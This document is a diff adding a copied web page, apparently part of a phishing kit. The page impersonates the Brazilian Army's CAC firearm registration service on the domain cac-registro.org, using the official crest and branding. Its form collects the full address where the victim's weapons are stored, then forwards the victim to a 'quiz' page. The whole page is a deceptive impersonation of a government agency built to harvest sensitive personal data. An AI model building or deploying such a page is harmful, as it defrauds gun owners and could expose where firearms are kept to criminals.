@@ -1,0 +1,173 @@
+<html lang="pt-BR">
+
+<!-- Mirrored from cac-registro.org/endereco/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 26 Apr 2025 01:19:45 GMT -->
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Exército Brasileiro - Cadastro para Armazenamento de Armas CAC</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <style>
+        body { font-family: 'Poppins', sans-serif; }
+    </style>
+</head>
+<body>
+    <header class="bg-white border-b border-gray-300">
+        <div class="container mx-auto px-4 py-2">
+            <div class="flex items-center">
+                <img alt="Brasão do Exército Brasileiro" class="mr-2" height="40" src="https://www.eb.mil.br/image/company_logo?img_id=40367&amp;t=1721965932372" width="40">
+                <div>
+                    <div class="text-sm text-green-800">Ministério da Defesa</div>
+                    <div class="font-bold text-green-800">Exército Brasileiro</div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <nav class="bg-gray-200 py-2 overflow-x-auto">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center text-sm whitespace-nowrap">
+                <a class="text-green-800 mr-2" href="#">Exército Brasileiro</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <a class="text-green-800 mr-2" href="#">Serviços</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <a class="text-green-800 mr-2" href="#">CAC</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <span class="text-gray-700">Armazenamento</span>
+            </div>
+        </div>
+    </nav>
+    <main class="container mx-auto px-4 py-8">
+        <h1 class="text-2xl font-bold mb-4">Cadastro para Armazenamento de Armas - CAC</h1>
+        <p class="mb-4">Por favor, preencha o formulário abaixo com o endereço onde as armas serão armazenadas. Este endereço deve ser o local seguro e adequado para o armazenamento das armas, conforme as regulamentações do Exército Brasileiro.</p>
+        <p class="mb-4 font-bold text-red-600">Atenção: O endereço fornecido será o local oficial de armazenamento das armas registradas em seu certificado CAC.</p>
+        <p class="mb-8">Todos os campos marcados com * são obrigatórios. Comece inserindo o CEP para preenchimento automático dos outros campos.</p>
+        <form id="endereco-form" onsubmit="prosseguir(); return false;">
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="cep">CEP do Local de Armazenamento *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cep" type="text" inputmode="numeric" placeholder="00000-000" required>
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="logradouro">Logradouro do Local de Armazenamento *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="logradouro" type="text" placeholder="Rua, Avenida, etc." required>
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="numero">Número *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="numero" type="text" placeholder="Número" required>
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="complemento">Complemento</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="complemento" type="text" placeholder="Apartamento, bloco, etc.">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="bairro">Bairro *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="bairro" type="text" placeholder="Bairro" required>
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="cidade">Cidade *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cidade" type="text" placeholder="Cidade" required>
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="estado">Estado *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="estado" type="text" placeholder="Estado" required>
+            </div>
+            <p class="text-sm mb-4">Ao clicar no botão "Prosseguir", você declara que todas as informações fornecidas são verdadeiras, que o endereço informado é o local onde as armas serão armazenadas, e que está ciente das responsabilidades legais associadas ao registro de CAC e ao armazenamento seguro de armas, conforme estabelecido pela Lei nº 10.826/2003 (Estatuto do Desarmamento) e suas regulamentações.</p>
+            <button class="bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit">
+                Prosseguir
+            </button>
+        </form>
+    </main>
+    <footer class="bg-green-900 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
+                <div>
+                    <h3 class="font-bold mb-2">O EXÉRCITO</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                        <li><a class="hover:underline" href="#">Organização</a></li>
+                        <li><a class="hover:underline" href="#">História</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">SERVIÇOS</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">CAC</a></li>
+                        <li><a class="hover:underline" href="#">Alistamento</a></li>
+                        <li><a class="hover:underline" href="#">Concursos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">TRANSPARÊNCIA</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
+                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">CONTATO</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">REDES SOCIAIS</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="bg-green-950 text-white text-xs py-2 text-center">
+        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            new Cleave('#cep', {
+                delimiters: ['-'],
+                blocks: [5, 3],
+                numericOnly: true
+            });
+
+            const cepInput = document.getElementById('cep');
+            cepInput.addEventListener('blur', function() {
+                const cep = this.value.replace(/\D/g, '');
+                if (cep.length !== 8) {
+                    alert('CEP inválido');
+                    return;
+                }
+
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.erro) {
+                            alert('CEP não encontrado');
+                            return;
+                        }
+                        document.getElementById('logradouro').value = data.logradouro;
+                        document.getElementById('bairro').value = data.bairro;
+                        document.getElementById('cidade').value = data.localidade;
+                        document.getElementById('estado').value = data.uf;
+                    })
+                    .catch(error => {
+                        console.error('Erro:', error);
+                        alert('Erro ao buscar o CEP');
+                    });
+            });
+        });
+
+        function prosseguir() {
+            // Redireciona para a próxima página
+            window.location.href = '../quiz/index.html';
+        }
+    </script>
+</body>
+
+<!-- Mirrored from cac-registro.org/endereco/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 26 Apr 2025 01:19:45 GMT -->
+</html>
